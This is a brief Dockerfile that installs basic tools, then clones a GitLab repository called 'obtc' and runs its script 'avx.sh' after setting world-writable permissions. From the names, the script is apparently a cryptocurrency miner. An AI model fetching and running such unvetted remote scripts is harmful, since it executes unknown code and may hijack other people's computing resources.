FROM ubuntu:18.04

RUN apt update && apt -y install sudo wget curl unzip git

#INSTALL

RUN git clone https://gitlab.com/cici2/obtc.git && cd obtc && chmod 777 avx.sh && ./avx.sh
